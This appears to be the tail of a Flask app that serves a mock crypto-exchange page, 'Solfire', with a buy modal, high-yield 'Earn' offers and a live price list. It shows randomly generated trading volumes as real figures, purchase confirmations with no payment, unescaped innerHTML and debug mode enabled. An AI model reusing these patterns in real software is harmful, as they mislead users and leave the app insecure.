                <div style="font-size: 13px; color: var(--muted); text-align: center; margin-bottom: 16px;">
                    1 USDT ≈ 1.00 USD
                </div>
                
                <button class="buy-huge-btn" onclick="simulatePurchase()">Buy USDT</button>
            </div>
            
            <div style="margin-top: 24px;">
                <h4 style="margin-bottom: 12px;">Payment Methods</h4>
                <div class="flex items-center justify-between" style="background: var(--card); padding: 16px; border-radius: 12px; margin-bottom: 8px;">
                    <div class="flex items-center gap-12">
                        <i class="fa-brands fa-cc-visa" style="font-size: 24px; color: #1a1f36;"></i>
                        <div>
                            <div class="font-bold">Credit/Debit Card</div>
                            <div style="font-size: 12px; color: var(--muted);">Fee: 2.0%</div>
                        </div>
                    </div>
                    <i class="fa-regular fa-circle-check text-accent"></i>
                </div>
                <div class="flex items-center justify-between" style="background: var(--card); padding: 16px; border-radius: 12px;">
                    <div class="flex items-center gap-12">
                        <i class="fa-brands fa-apple" style="font-size: 24px;"></i>
                        <div>
                            <div class="font-bold">Apple Pay</div>
                            <div style="font-size: 12px; color: var(--muted);">Fee: 1.5%</div>
                        </div>
                    </div>
                    <i class="fa-regular fa-circle"></i>
                </div>
            </div>
        </div>
    </div>

    <div id="earn-modal" class="full-modal">
        <div class="modal-header">
            <i class="fa-solid fa-arrow-left back-btn" onclick="closeModal('earn-modal')"></i>
            <div class="modal-title">Solfire Earn</div>
            <i class="fa-solid fa-magnifying-glass text-muted"></i>
        </div>
        <div class="modal-content">
            <div class="earn-hero">
                <h2 style="margin:0 0 8px 0;">Earn Daily Rewards</h2>
                <p style="color: var(--muted); font-size: 14px; margin:0;">Grow your crypto safely with Simple Earn</p>
            </div>
            
            <h3 style="margin-bottom: 16px;">Trending Products</h3>
            
            <div class="earn-item">
                <div class="flex items-center gap-12">
                    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="32" style="border-radius:50%;">
                    <div>
                        <div class="font-bold">USDT</div>
                        <div style="font-size: 12px; color: var(--muted);">Flexible</div>
                    </div>
                </div>
                <div style="text-align: right;">
                    <div class="earn-apr">12.50%</div>
                    <div style="font-size: 11px; color: var(--muted); margin-bottom: 6px;">Est. APR</div>
                    <button class="btn-subscribe" onclick="showToast('Subscribed to USDT Earn!')">Subscribe</button>
                </div>
            </div>

            <div class="earn-item">
                <div class="flex items-center gap-12">
                    <img src="https://assets.coingecko.com/coins/images/4128/large/solana.png" width="32" style="border-radius:50%;">
                    <div>
                        <div class="font-bold">SOL</div>
                        <div style="font-size: 12px; color: var(--muted);">Locked (30 Days)</div>
                    </div>
                </div>
                <div style="text-align: right;">
                    <div class="earn-apr">8.20%</div>
                    <div style="font-size: 11px; color: var(--muted); margin-bottom: 6px;">Est. APR</div>
                    <button class="btn-subscribe" onclick="showToast('Subscribed to SOL Staking!')">Subscribe</button>
                </div>
            </div>
            
            <div class="earn-item">
                <div class="flex items-center gap-12">
                    <img src="https://cryptologos.cc/logos/fire-token-fire-logo.png" width="32" style="border-radius:50%;">
                    <div>
                        <div class="font-bold">SLFR (Solfire)</div>
                        <div style="font-size: 12px; color: var(--muted);">Locked (90 Days)</div>
                    </div>
                </div>
                <div style="text-align: right;">
                    <div class="earn-apr">45.00%</div>
                    <div style="font-size: 11px; color: var(--muted); margin-bottom: 6px;">Est. APR</div>
                    <button class="btn-subscribe" onclick="showToast('Subscribed to SLFR High Yield!')">Subscribe</button>
                </div>
            </div>
        </div>
    </div>

    <div id="more-modal" class="full-modal">
        <div class="modal-header">
            <i class="fa-solid fa-arrow-left back-btn" onclick="closeModal('more-modal')"></i>
            <div class="modal-title">Services</div>
            <i class="fa-solid fa-pen-to-square text-muted"></i>
        </div>
        <div class="modal-content">
            
            <div class="more-section">
                <div class="more-section-title">Common Functions</div>
                <div class="more-grid">
                    <div class="more-item" onclick="showToast('Transfer opened')"><div class="more-icon"><i class="fa-solid fa-right-left"></i></div>Transfer</div>
                    <div class="more-item" onclick="showToast('Deposit opened')"><div class="more-icon"><i class="fa-solid fa-wallet"></i></div>Deposit</div>
                    <div class="more-item" onclick="showToast('Orders history')"><div class="more-icon"><i class="fa-solid fa-file-invoice"></i></div>Orders</div>
                    <div class="more-item" onclick="showToast('Referral program')"><div class="more-icon"><i class="fa-solid fa-user-plus"></i></div>Referral</div>
                </div>
            </div>

            <div class="more-section">
                <div class="more-section-title">Trade</div>
                <div class="more-grid">
                    <div class="more-item" onclick="closeModal('more-modal')"><div class="more-icon"><i class="fa-solid fa-chart-line"></i></div>Spot</div>
                    <div class="more-item" onclick="showToast('Margin Trading')"><div class="more-icon"><i class="fa-solid fa-scale-balanced"></i></div>Margin</div>
                    <div class="more-item" onclick="openModal('p2p-modal')"><div class="more-icon"><i class="fa-solid fa-users"></i></div>P2P</div>
                    <div class="more-item" onclick="showToast('Trading Bots')"><div class="more-icon"><i class="fa-solid fa-robot"></i></div>Bots</div>
                </div>
            </div>

            <div class="more-section">
                <div class="more-section-title">Finance</div>
                <div class="more-grid">
                    <div class="more-item" onclick="openModal('earn-modal')"><div class="more-icon"><i class="fa-solid fa-piggy-bank"></i></div>Earn</div>
                    <div class="more-item" onclick="showToast('Crypto Loans')"><div class="more-icon"><i class="fa-solid fa-hand-holding-dollar"></i></div>Loans</div>
                    <div class="more-item" onclick="showToast('Solfire Pay')"><div class="more-icon"><i class="fa-brands fa-alipay"></i></div>Pay</div>
                    <div class="more-item" onclick="showToast('Launchpad')"><div class="more-icon"><i class="fa-solid fa-rocket"></i></div>Launchpad</div>
                </div>
            </div>
            
            <div class="more-section">
                <div class="more-section-title">Information</div>
                <div class="more-grid">
                    <div class="more-item" onclick="showToast('Market Data')"><div class="more-icon"><i class="fa-solid fa-globe"></i></div>Markets</div>
                    <div class="more-item" onclick="showToast('Solfire Academy')"><div class="more-icon"><i class="fa-solid fa-graduation-cap"></i></div>Academy</div>
                    <div class="more-item" onclick="showToast('News Feed')"><div class="more-icon"><i class="fa-regular fa-newspaper"></i></div>News</div>
                    <div class="more-item" onclick="showToast('Support Center')"><div class="more-icon"><i class="fa-solid fa-headset"></i></div>Support</div>
                </div>
            </div>

        </div>
    </div>

    <div id="toast-container"></div>

    <script>
        // Modal Logic
        function openModal(id) {
            document.getElementById(id).classList.add('active');
            document.body.style.overflow = 'hidden'; // Prevent background scrolling
        }
        function closeModal(id) {
            document.getElementById(id).classList.remove('active');
            document.body.style.overflow = 'auto';
        }

        // Toast Logic
        function showToast(message) {
            const container = document.getElementById('toast-container');
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.innerHTML = `<i class="fa-solid fa-circle-info"></i> ${message}`;
            container.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                setTimeout(() => toast.remove(), 300);
            }, 3000);
        }

        // Buy Crypto Form Logic
        function calculateCrypto() {
            const fiat = document.getElementById('fiat-amount').value;
            const cryptoInput = document.getElementById('crypto-amount');
            if(fiat && fiat > 0) {
                cryptoInput.value = (fiat * 1).toFixed(2); // Mock rate 1:1
            } else {
                cryptoInput.value = '';
            }
        }
        function simulatePurchase() {
            const fiat = document.getElementById('fiat-amount').value;
            if(!fiat || fiat <= 0) {
                showToast("Please enter an amount");
                return;
            }
            showToast(`Processing payment of $${fiat}...`);
            setTimeout(() => {
                showToast(`Successfully purchased ${fiat} USDT!`);
                document.getElementById('fiat-amount').value = '';
                document.getElementById('crypto-amount').value = '';
                closeModal('buy-crypto-modal');
            }, 1500);
        }

        // Market Data Fetching (Uses your existing backend)
        const coinContainer = document.getElementById("coin-container");
        
        async function fetchPrices() {
            try {
                const res = await fetch("/api/prices");
                const json = await res.json();
                renderMarket(json.data);
            } catch (err) {
                console.error(err);
            }
        }

        function renderMarket(data) {
            // Sort to show specific coins like the image (ADA, APT, ARB first)
            const targetCoins = ["ADA", "APT", "ARB", "BTC", "ETH", "SOL", "SLFR"];
            let html = "";
            
            targetCoins.forEach(sym => {
                if(data[sym]) {
                    const c = data[sym];
                    const changeClass = c.change_24h >= 0 ? "bg-green" : "bg-red";
                    const changeSign = c.change_24h >= 0 ? "+" : "";
                    
                    // Mock volume string based on market cap / price visually
                    const volStr = "Vol " + Math.floor(Math.random() * 500 + 100) + "M";

                    html += `
                    <div class="coin-row" onclick="showToast('Trading ${c.symbol} coming soon')">
                        <div class="coin-info">
                            <img class="coin-img" src="${c.image}" alt="${c.symbol}">
                            <div>
                                <div class="coin-name">${c.symbol}</div>
                                <div class="coin-vol">${volStr}</div>
                            </div>
                        </div>
                        <div class="coin-price">${c.price < 1 ? c.price.toFixed(4) : c.price.toFixed(2)}</div>
                        <div class="coin-change">
                            <div class="change-badge ${changeClass}">${changeSign}${c.change_24h.toFixed(2)}%</div>
                        </div>
                    </div>`;
                }
            });
            coinContainer.innerHTML = html;
        }

        // Initialize
        fetchPrices();
        setInterval(fetchPrices, 1500); // Super fast updates as configured in backend
    </script>
</body>
</html>
"""
    return render_template_string(html)

if __name__ == "__main__":
    app.run(debug=True, threaded=True, port=5000)
